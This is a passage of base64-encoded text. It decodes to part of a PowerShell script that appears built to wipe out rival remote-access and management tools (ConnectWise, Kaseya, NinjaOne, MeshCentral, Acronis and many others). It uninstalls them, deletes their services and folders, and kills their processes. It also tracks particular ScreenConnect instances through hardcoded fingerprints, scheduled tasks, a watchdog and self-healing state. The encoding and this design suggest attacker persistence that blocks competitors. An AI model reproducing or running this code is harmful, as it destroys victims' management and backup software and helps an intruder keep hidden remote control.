YXlzT24qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcSVNMIE9ubGluZSIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxJU0wgT25saW5lIik7IFByb2Q9QCgnSVNMIExpZ2h0KicsJ0lTTCBB
bHdheXNPbionKSB9CiAgICAgICAgQHsgVGFnPSdBbW15eSc7ICAgICAgICBTdmM9QCgnQW1teXkq
Jyk7IFByb2M9QCgnQW1teXkqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQW1teXkiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQW1teXkiKTsgUHJvZD1AKCdBbW15eSonKSB9CiAgICAg
ICAgQHsgVGFnPSdVbHRyYVZpZXdlcic7ICBTdmM9QCgnVWx0cmFWaWV3ZXIqJyk7IFByb2M9QCgn
VWx0cmFWaWV3ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVWx0cmFWaWV3ZXIiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVWx0cmFWaWV3ZXIiKTsgUHJvZD1AKCdVbHRyYVZpZXdl
cionKSB9CiAgICAgICAgQHsgVGFnPSdBZXJvQWRtaW4nOyAgICBTdmM9QCgnQWVyb0FkbWluKicp
OyBQcm9jPUAoJ0Flcm9BZG1pbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBZXJvQWRt
aW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWVyb0FkbWluIik7IFByb2Q9QCgnQWVyb0Fk
bWluKicpIH0KICAgICAgICBAeyBUYWc9J0xpdGVNYW5hZ2VyJzsgIFN2Yz1AKCdMaXRlTWFuYWdl
cionKTsgUHJvYz1AKCdST01TZXJ2ZXIqJywnUk9NVmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXExpdGVNYW5hZ2VyIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExpdGVNYW5h
Z2VyIik7IFByb2Q9QCgnTGl0ZU1hbmFnZXIqJykgfQogICAgICAgIEB7IFRhZz0nUmFkbWluJzsg
ICAgICAgU3ZjPUAoJ1JhZG1pbionKTsgUHJvYz1AKCdyc2VydmVyMyonLCdSYWRtaW4qJyk7IERp
cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUmFkbWluIFNlcnZlciAzIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XFJhZG1pbiBTZXJ2ZXIgMyIpOyBQcm9kPUAoJ1JhZG1pbionKSB9CiAgICAgICAg
QHsgVGFnPSdOb01hY2hpbmUnOyAgICBTdmM9QCgnbnhzZXJ2ZXIqJywnbnhkKicpOyBQcm9jPUAo
J254ZConLCdueHNlcnZlcionLCdueHJ1bm5lcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
c1xOb01hY2hpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTm9NYWNoaW5lIik7IFByb2Q9
QCgnTm9NYWNoaW5lKicpIH0KICAgICAgICBAeyBUYWc9J05pbmphT25lJzsgICAgIFN2Yz1AKCdO
aW5qYVJNTUFnZW50JywnbmluamFybW0qJywnTmluamFSTU0qJyk7IFByb2M9QCgnTmluamFSTU1B
Z2VudConLCduaW5qYXJtbSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xOaW5qYVJNTUFn
ZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5pbmphUk1NQWdlbnQiLCIkZW52OlByb2dy
YW1EYXRhXE5pbmphUk1NQWdlbnQiLCIkZW52OlByb2dyYW1GaWxlc1xOaW5qYU9uZSIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxOaW5qYU9uZSIpOyBQcm9kPUAoJ05pbmphUk1NKicsJ05pbmph
T25lKicpIH0KICAgICAgICBAeyBUYWc9J0F0ZXJhJzsgICAgICAgIFN2Yz1AKCdBdGVyYUFnZW50
Jyk7IFByb2M9QCgnQXRlcmFBZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBVEVS
QSBOZXR3b3JrcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBVEVSQSBOZXR3b3JrcyIsIiRl
bnY6UHJvZ3JhbURhdGFcQVRFUkEgTmV0d29ya3MiKTsgUHJvZD1AKCdBdGVyYSonKSB9CiAgICAg
ICAgQHsgVGFnPSdDb25uZWN0V2lzZSc7ICBTdmM9QCgnTFRTZXJ2aWNlJywnTFRTdmNNb24nKTsg
UHJvYz1AKCdMVFN2YyonLCdMVFRyYXkqJyk7IERpcnM9QCgiJGVudjp3aW5kaXJcTFRTdmMiLCIk
ZW52OlByb2dyYW1GaWxlc1xMYWJUZWNoIENsaWVudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYp
fVxMYWJUZWNoIENsaWVudCIpOyBQcm9kPUAoJ0Nvbm5lY3RXaXNlIEF1dG9tYXRlKicsJ0Nvbm5l
Y3RXaXNlIFJNTSonLCdMYWJUZWNoKicpIH0KICAgICAgICBAeyBUYWc9J0thc2V5YSc7ICAgICAg
IFN2Yz1AKCdBZ2VudE1vbicsJ0thc2V5YSonLCdLQUFEUyonKTsgUHJvYz1AKCdBZ2VudE1vbion
LCdLYXNleWEqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcS2FzZXlhIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XEthc2V5YSIpOyBQcm9kPUAoJ0thc2V5YSBWU0EqJywnS2FzZXlhIEFn
ZW50KicpIH0KICAgICAgICBAeyBUYWc9J05hYmxlJzsgICAgICAgIFN2Yz1AKCdBZHZhbmNlZCBN
b25pdG9yaW5nIEFnZW50KicsJ04tYWJsZSonLCdOQ2VudHJhbConKTsgUHJvYz1AKCdGaWxlU3lz
dGVtQWdlbnQqJywnTkNlbnRyYWwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWR2YW5j
ZWQgTW9uaXRvcmluZyBBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZHZhbmNlZCBN
b25pdG9yaW5nIEFnZW50IiwiJGVudjpQcm9ncmFtRmlsZXNcTi1hYmxlIFRlY2hub2xvZ2llcyIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOLWFibGUgVGVjaG5vbG9naWVzIiwiJGVudjpQcm9n
cmFtRmlsZXNcTVNQQSBGaWxlcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNU1BBIEZpbGVz
Iik7IFByb2Q9QCgnQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudConLCdOLWFibGUqJywnTi1jZW50
cmFsKicsJ04tc2lnaHQqJywnVGFrZSBDb250cm9sKicsJ1NvbGFyV2luZHMgTVNQKicpIH0KICAg
ICAgICBAeyBUYWc9J1N5bmNybyc7ICAgICAgIFN2Yz1AKCdTeW5jcm8qJywnS2FidXRvKicpOyBQ
cm9jPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUmVw
YWlyVGVjaCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSZXBhaXJUZWNoIiwiJGVudjpQcm9n
cmFtRmlsZXNcU3luY3JvIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN5bmNybyIsIiRlbnY6
UHJvZ3JhbURhdGFcU3luY3JvIik7IFByb2Q9QCgnU3luY3JvKicsJ0thYnV0byonLCdSZXBhaXJU
ZWNoKicpIH0KICAgICAgICBAeyBUYWc9J1B1bHNld2F5JzsgICAgIFN2Yz1AKCdQdWxzZXdheSon
LCdQQyBNb25pdG9yKicpOyBQcm9jPUAoJ1BDTW9uaXRvck1ncionLCdQQ01vbml0b3JNYW5hZ2Vy
KicsJ1B1bHNld2F5KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFB1bHNld2F5IiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFB1bHNld2F5IiwiJGVudjpQcm9ncmFtRmlsZXNcUEMgTW9u
aXRvciIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQQyBNb25pdG9yIik7IFByb2Q9QCgnUHVs
c2V3YXkqJywnUEMgTW9uaXRvcionKSB9CiAgICAgICAgQHsgVGFnPSdTdXBlck9wcyc7ICAgICBT
dmM9QCgnU3VwZXJPcHMqJyk7IFByb2M9QCgnU3VwZXJPcHMqJyk7IERpcnM9QCgiJGVudjpQcm9n
cmFtRmlsZXNcU3VwZXJPcHMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU3VwZXJPcHMiLCIk
ZW52OlByb2dyYW1EYXRhXFN1cGVyT3BzIik7IFByb2Q9QCgnU3VwZXJPcHMqJykgfQogICAgICAg
IEB7IFRhZz0nTGV2ZWwnOyAgICAgICAgU3ZjPUAoJ0xldmVsKicpOyBQcm9jPUAoJ2xldmVsKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXExldmVsIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XExldmVsIiwiJGVudjpQcm9ncmFtRGF0YVxMZXZlbCIpOyBQcm9kPUAoJ0xldmVsKicpIH0K
ICAgICAgICBAeyBUYWc9J0FjdGlvbjEnOyAgICAgIFN2Yz1AKCdBY3Rpb24xKicpOyBQcm9jPUAo
J0FjdGlvbjEqJywnYWN0aW9uMV9hZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xB
Y3Rpb24xIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFjdGlvbjEiLCIkZW52OlByb2dyYW1E
YXRhXEFjdGlvbjEiKTsgUHJvZD1AKCdBY3Rpb24xKicpIH0KICAgICAgICBAeyBUYWc9J01hbmFn
ZUVuZ2luZSc7IFN2Yz1AKCdNYW5hZ2VFbmdpbmUqJywnVUVNUyonLCdEQ0FnZW50KicpOyBQcm9j
PUAoJ01hbmFnZUVuZ2luZSonLCdkY2FnZW50KicsJ1VFTVMqJyk7IERpcnM9QCgiJGVudjpQcm9n
cmFtRmlsZXNcTWFuYWdlRW5naW5lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1hbmFnZUVu
Z2luZSIpOyBQcm9kPUAoJ01hbmFnZUVuZ2luZSonLCdVRU1TKicsJ0Rlc2t0b3AgQ2VudHJhbCon
LCdFbmRwb2ludCBDZW50cmFsKicsJ1JNTSBDZW50cmFsKicpIH0KICAgICAgICBAeyBUYWc9J1Rh
Y3RpY2FsUk1NJzsgIFN2Yz1AKCd0YWN0aWNhbHJtbSonLCdNZXNoIEFnZW50JywnTWVzaEFnZW50
Jyk7IFByb2M9QCgndGFjdGljYWxybW0qJywnbWVzaGFnZW50KicsJ01lc2hBZ2VudConKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xUYWN0aWNhbEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XFRhY3RpY2FsQWdlbnQiLCIkZW52OlByb2dyYW1GaWxlc1xNZXNoIEFnZW50IiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1lc2ggQWdlbnQiKTsgUHJvZD1AKCdUYWN0aWNhbConLCdN
ZXNoIEFnZW50KicsJ01lc2hDZW50cmFsKicpIH0KICAgICAgICBAeyBUYWc9J01lc2hDZW50cmFs
JzsgIFN2Yz1AKCdNZXNoIEFnZW50JywnTWVzaEFnZW50JywnTWVzaENlbnRyYWwqJyk7IFByb2M9
QCgnTWVzaEFnZW50KicsJ01lc2hDZW50cmFsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XE1lc2ggQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWVzaCBBZ2VudCIpOyBQcm9k
PUAoJ01lc2gqQWdlbnQqJywnTWVzaENlbnRyYWwqJykgfQogICAgICAgIEB7IFRhZz0nQ29udGlu
dXVtJzsgICAgU3ZjPUAoJ1NBQVoqJywnQ29udGludXVtKicpOyBQcm9jPUAoJ1NBQVoqJywnQ29u
dGludXVtKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNBQVpPRCIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxTQUFaT0QiLCIkZW52OlByb2dyYW1GaWxlc1xDb250aW51dW0iLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cQ29udGludXVtIik7IFByb2Q9QCgnQ29udGludXVtKicsJ1NB
QVoqJykgfQogICAgICAgIEB7IFRhZz0nTmF2ZXJpc2snOyAgICAgU3ZjPUAoJ05hdmVyaXNrKicp
OyBQcm9jPUAoJ05hdmVyaXNrKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5hdmVyaXNr
IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5hdmVyaXNrIik7IFByb2Q9QCgnTmF2ZXJpc2sq
JykgfQogICAgICAgIEB7IFRhZz0nSW1teUJvdCc7ICAgICAgU3ZjPUAoJ0ltbXlCb3QqJywnSW1t
eSonKTsgUHJvYz1AKCdJbW15QWdlbnQqJywnSW1teUJvdConKTsgRGlycz1AKCIkZW52OlByb2dy
YW1GaWxlc1xJbW15Qm90IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEltbXlCb3QiLCIkZW52
OlByb2dyYW1EYXRhXEltbXlCb3QiKTsgUHJvZD1AKCdJbW15Qm90KicpIH0KICAgICAgICBAeyBU
YWc9J0F1dG9tb3gnOyAgICAgIFN2Yz1AKCdhbWFnZW50KicsJ0F1dG9tb3gqJyk7IFByb2M9QCgn
YW1hZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBdXRvbW94IiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XEF1dG9tb3giLCIkZW52OlByb2dyYW1EYXRhXGFtYWdlbnQiKTsgUHJv
ZD1AKCdBdXRvbW94KicpIH0KICAgICAgICBAeyBUYWc9J0Fjcm9uaXNDeWJlcic7IFN2Yz1AKCdB
Y3JvbmlzKicpOyBQcm9jPUAoJ2Fjcm9jbWQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
QWNyb25pcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBY3JvbmlzIik7IFByb2Q9QCgnQWNy
b25pcyBDeWJlcionLCdBY3JvbmlzIEFnZW50KicsJ0N5YmVyIFByb3RlY3QgQWdlbnQqJykgfQog
ICAgICAgIEB7IFRhZz0nRG9tb3R6JzsgICAgICAgU3ZjPUAoJ0RvbW90eionKTsgUHJvYz1AKCdE
b21vdHoqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcRG9tb3R6IiwiJHtlbnY6UHJvZ3Jh
bUZpbGVzKHg4Nil9XERvbW90eiIpOyBQcm9kPUAoJ0RvbW90eionKSB9CiAgICAgICAgQHsgVGFn
PSdBdXZpayc7ICAgICAgICBTdmM9QCgnQXV2aWsqJyk7IFByb2M9QCgnQXV2aWsqJyk7IERpcnM9
QCgiJGVudjpQcm9ncmFtRmlsZXNcQXV2aWsiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQXV2
aWsiKTsgUHJvZD1AKCdBdXZpayonKSB9CiAgICAgICAgQHsgVGFnPSdCYXJyYWN1ZGFSTU0nOyBT
dmM9QCgnQmFycmFjdWRhKicpOyBQcm9jPUAoJ01XU2VydmljZSonKTsgRGlycz1AKCIkZW52OlBy
b2dyYW1GaWxlc1xCYXJyYWN1ZGEiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQmFycmFjdWRh
IiwiJGVudjpQcm9ncmFtRmlsZXNcTGV2ZWwgUGxhdGZvcm1zIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XExldmVsIFBsYXRmb3JtcyIpOyBQcm9kPUAoJ0JhcnJhY3VkYSBSTU0qJywnTWFuYWdl
ZCBXb3JrcGxhY2UqJykgfQogICAgICAgIEB7IFRhZz0nR292ZXJsYW4nOyAgICAgU3ZjPUAoJ0dv
dmVybGFuKicpOyBQcm9jPUAoJ2dvdmVybGFuKicsJ2dvdmFnZW50KicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXEdvdmVybGFuIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdvdmVybGFu
Iik7IFByb2Q9QCgnR292ZXJsYW4qJykgfQogICAgICAgIEB7IFRhZz0nUERRJzsgICAgICAgICAg
U3ZjPUAoJ1BEUSonKTsgUHJvYz1AKCdQRFFSdW5uZXIqJywnUERRSW52ZW50b3J5KicsJ1BEUURl
cGxveSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBZG1pbiBBcnNlbmFsIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XEFkbWluIEFyc2VuYWwiLCIkZW52OlByb2dyYW1GaWxlc1xQRFEi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUERRIik7IFByb2Q9QCgnUERRIERlcGxveSonLCdQ
RFEgSW52ZW50b3J5KicsJ1BEUSBDb25uZWN0KicpIH0KICAgICkKCiAgICBmb3JlYWNoICgkdG9v
bCBpbiAkcm1tKSB7CiAgICAgICAgJGhpdCA9ICRmYWxzZQogICAgICAgIGZvcmVhY2ggKCRwYXQg
aW4gJHRvb2wuUHJvZCkgewogICAgICAgICAgICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVu
aW5zdGFsbFJvb3RzKSB7CiAgICAgICAgICAgICAgICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJv
ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAg
ICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0aCAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUKICAgICAgICAgICAgICAgICAgICBpZiAoJGRuIC1h
bmQgJGRuIC1saWtlICRwYXQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKElzLURhdHRv
S2VlcGVyICRkbikgeyBMb2cgInJtbV9za2lwX2RhdHRvX2tlZXAgWyRkbl0iOyByZXR1cm4gfQog
ICAgICAgICAgICAgICAgICAgICAgICBpZiAoVW5pbnN0YWxsLVByb2R1Y3RLZXkgJF8pIHsgJG4u
cm1tKys7ICRoaXQgPSAkdHJ1ZSB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAg
ICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZvcmVhY2ggKCRwYXQgaW4gJHRv
b2wuU3ZjKSB7CiAgICAgICAgICAgIEdldC1TZXJ2aWNlIC1OYW1lICRwYXQgLUVycm9yQWN0aW9u
IFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAo
SXMtRGF0dG9LZWVwZXIgJF8uTmFtZSAtb3IgSXMtRGF0dG9LZWVwZXIgJF8uRGlzcGxheU5hbWUp
IHsgTG9nICJybW1fc2tpcF9kYXR0b19zdmMgJCgkXy5OYW1lKSI7IHJldHVybiB9CiAgICAgICAg
ICAgICAgICAmIHNjLmV4ZSBzdG9wICIkKCRfLk5hbWUpIiAyPiYxIHwgT3V0LU51bGwKICAgICAg
ICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNTAwCiAgICAgICAgICAgICAgICAm
IHNjLmV4ZSBkZWxldGUgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICAg
ICAgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fc3ZjX2RlbGV0ZWQgJCgkXy5OYW1l
KSBbJCgkdG9vbC5UYWcpXSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmb3JlYWNo
ICgkcGF0IGluICR0b29sLlByb2MpIHsKICAgICAgICAgICAgR2V0LVByb2Nlc3MgLU5hbWUgJHBh
dCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAg
ICAgICAgICAgIFN0b3AtUHJvY2VzcyAtSWQgJF8uSWQgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxl
bnRseUNvbnRpbnVlCiAgICAgICAgICAgICAgICAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlOyBMb2cg
InJtbV9wcm9jX2tpbGxlZCAkKCRfLlByb2Nlc3NOYW1lKSBbJCgkdG9vbC5UYWcpXSIKICAgICAg
ICAgICAgfQogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkZCBpbiAkdG9vbC5EaXJzKSB7CiAg
ICAgICAgICAgIGlmICgkZCAtYW5kIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSkgewogICAg
ICAgICAgICAgICAgaWYgKElzLURhdHRvS2VlcGVyICRkKSB7IExvZyAicm1tX3NraXBfZGF0dG9f
ZGlyICRkIjsgY29udGludWUgfQogICAgICAgICAgICAgICAgaWYgKEZvcmNlLVJlbW92ZURpciAk
ZCkgeyAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlOyBMb2cgInJtbV9kaXJfcmVtb3ZlZCAkZCIgfQog
ICAgICAgICAgICAgICAgZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJybW1fZGlyX1JFTU9WRV9GQUlM
RUQgJGQiIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoJGhpdCkgeyBMb2cg
InJtbV9leHRlcm1pbmF0ZWQgJCgkdG9vbC5UYWcpIiB9CiAgICB9CgogICAgJHN1bW1hcnkgPSAi
ZXh0ZXJtaW5hdGUgc3ZjPSQoJG4uc3ZjKSBwcm9jPSQoJG4ucHJvYykgZGlyPSQoJG4uZGlyKSBw
cm9kdWN0PSQoJG4ucHJvZHVjdCkgcm1tPSQoJG4ucm1tKSBmYWlsPSQoJG4uZmFpbCkiCiAgICBM
b2cgJHN1bW1hcnkKICAgIHJldHVybiAkc3VtbWFyeQp9CgpmdW5jdGlvbiBVcGRhdGUtU3RhdGUg
ewogICAgJGtlZXAgPSBAKEdldC1LZWVwRmluZ2VycHJpbnRzKQogICAgJGdyeXhhRnAgPSBHZXQt
R3J5eGFGcAogICAgJHByaW0gPSAkbnVsbDsgJGFsdCA9ICRudWxsOyAkc2NyaXB0OmdyeXhhID0g
JG51bGwKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25u
ZWN0IENsaWVudConKSkgewogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1m
XXsxNn0pXCknKSB7CiAgICAgICAgICAgIGlmICgkbWF0Y2hlc1sxXSAtZXEgJzVmNjAxMDU3OTg1
MmU1MDcnKSB7ICRwcmltID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAgICAgICAgICAgIGVsc2VpZiAo
JG1hdGNoZXNbMV0gLWVxICdmODYxYzgxNDBkNDUzNDI3JykgeyAkYWx0ID0gIiQoJHN2Yy5TdGF0
dXMpIiB9CiAgICAgICAgICAgIGVsc2VpZiAoJG1hdGNoZXNbMV0gLWVxICRncnl4YUZwKSB7ICRz
Y3JpcHQ6Z3J5eGEgPSAiJCgkc3ZjLlN0YXR1cykiIH0KICAgICAgICB9CiAgICB9CiAgICAkZm9y
ZWlnbiA9IEAoKQogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNlcnZpY2UgLU5hbWUgJ1NjcmVl
bkNvbm5lY3QgQ2xpZW50KicpKSB7CiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFsw
LTlhLWZdezE2fSlcKScgLWFuZCAkbWF0Y2hlc1sxXSAtbm90aW4gJGtlZXApIHsKICAgICAgICAg
ICAgJGZvcmVpZ24gKz0gJG1hdGNoZXNbMV0KICAgICAgICB9CiAgICB9CiAgICAkaWQgPSBSZWFk
LUlkZW50aXR5CiAgICAkdGFza3NPayA9IDA7ICR0YXNrc1RvdGFsID0gMAogICAgZm9yZWFjaCAo
JGsgaW4gJ1RBU0tfQScsJ1RBU0tfQicsJ1RBU0tfQycsJ1RBU0tfRCcpIHsKICAgICAgICAkdGFz
a3NUb3RhbCsrCiAgICAgICAgJHRuID0gTm9ybWFsaXplLVRhc2tOYW1lIChbc3RyaW5nXSRpZFsk
a10pCiAgICAgICAgaWYgKC1ub3QgJHRuKSB7IGNvbnRpbnVlIH0KICAgICAgICAkbWFya2VyID0g
aWYgKCRrIC1lcSAnVEFTS19CJykgeyAnZXRsX21vbi5jbWQnIH0gZWxzZSB7ICdvd25fbW9uLmNt
ZCcgfQogICAgICAgIGlmICgoVGVzdC1UYXNrT3duc01vbiAkdG4gJG1hcmtlcikgLW9yIChUZXN0
LVRhc2tPd25zTW9uICgiXCR0biIpICRtYXJrZXIpKSB7ICR0YXNrc09rKysgfQogICAgfQogICAg
aWYgKC1ub3QgJE1vblBhdGgpIHsgJE1vblBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ293bl9t
b24uY21kJyB9CiAgICAkd2QgPSBFbnN1cmUtV2F0Y2hkb2cKICAgICRwcmV2ID0gQHt9CiAgICAk
c3RhdGVQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdzdGF0ZS5qc29uJwogICAgaWYgKFRlc3Qt
UGF0aCAkc3RhdGVQYXRoKSB7CiAgICAgICAgdHJ5IHsgKEdldC1Db250ZW50IC1MaXRlcmFsUGF0
aCAkc3RhdGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uKS5QU09iamVjdC5Qcm9wZXJ0aWVz
IHwgRm9yRWFjaC1PYmplY3QgeyAkcHJldlskXy5OYW1lXSA9ICRfLlZhbHVlIH0gfSBjYXRjaCB7
fQogICAgfQogICAgJGluc3RhbGxDb3VudCA9IDEKICAgIGlmICgkcHJldi5pbnN0YWxsQ291bnQp
IHsgJGluc3RhbGxDb3VudCA9IFtpbnRdJHByZXYuaW5zdGFsbENvdW50IH0KICAgIGlmICgkcHJl
di5wcmltIC1hbmQgJHByZXYucHJpbSAtbmUgJ1J1bm5pbmcnIC1hbmQgJHByaW0gLWVxICdSdW5u
aW5nJykgeyAkaW5zdGFsbENvdW50KysgfQogICAgJHN0YXRlID0gW29yZGVyZWRdQHsKICAgICAg
ICBob3N0ICAgICAgICAgPSAkZW52OkNPTVBVVEVSTkFNRQogICAgICAgIHRzICAgICAgICAgICA9
IChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKQogICAgICAgIGJ1aWxk
ICAgICAgICA9ICRCdWlsZAogICAgICAgIHByaW0gICAgICAgICA9ICQoaWYgKCRwcmltKSB7ICRw
cmltIH0gZWxzZSB7ICdNSVNTSU5HJyB9KQogICAgICAgIGFsdCAgICAgICAgICA9ICQoaWYgKCRh
bHQpIHsgJGFsdCB9IGVsc2UgeyAnTUlTU0lORycgfSkKICAgICAgICBncnl4YSAgICAgICAgPSAk
KGlmICgkc2NyaXB0OmdyeXhhKSB7ICRzY3JpcHQ6Z3J5eGEgfSBlbHNlIHsgJ01JU1NJTkcnIH0p
CiAgICAgICAgZ3J5eGFGcCAgICAgID0gJGdyeXhhRnAKICAgICAgICBmb3JlaWduICAgICAgPSAk
Zm9yZWlnbgogICAgICAgIHRhc2tzT2sgICAgICA9ICR0YXNrc09rCiAgICAgICAgdGFza3NUb3Rh
bCAgID0gJHRhc2tzVG90YWwKICAgICAgICB3YXRjaGRvZyAgICAgPSAkd2QKICAgICAgICBpbnN0
YWxsQ291bnQgPSAkaW5zdGFsbENvdW50CiAgICAgICAgbGFzdEhlYWwgICAgID0gJChpZiAoJEV4
dHJhKSB7IChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKSB9IGVsc2Vp
ZiAoJHByZXYubGFzdEhlYWwpIHsgJHByZXYubGFzdEhlYWwgfSBlbHNlIHsgJG51bGwgfSkKICAg
ICAgICBub3RlICAgICAgICAgPSAkRXh0cmEKICAgIH0KICAgICgkc3RhdGUgfCBDb252ZXJ0VG8t
SnNvbiAtQ29tcHJlc3MpIHwgU2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGggLUZv
cmNlCiAgICByZXR1cm4gJHN0YXRlCn0KCnN3aXRjaCAoJEFjdGlvbikgewogICAgJ2luaXQnICAg
ICAgICAgICAgeyAkaWQgPSBJbml0aWFsaXplLUlkZW50aXR5OyAkaWQuR2V0RW51bWVyYXRvcigp
IHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5LZXkpPSQoJF8uVmFsdWUpIiB9IH0KICAgICdpZGVu
dGl0eScgICAgICAgIHsgJGlkID0gUmVhZC1JZGVudGl0eTsgJGlkLkdldEVudW1lcmF0b3IoKSB8
IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0kKCRfLlZhbHVlKSIgfSB9CiAgICAnd2F0Y2hk
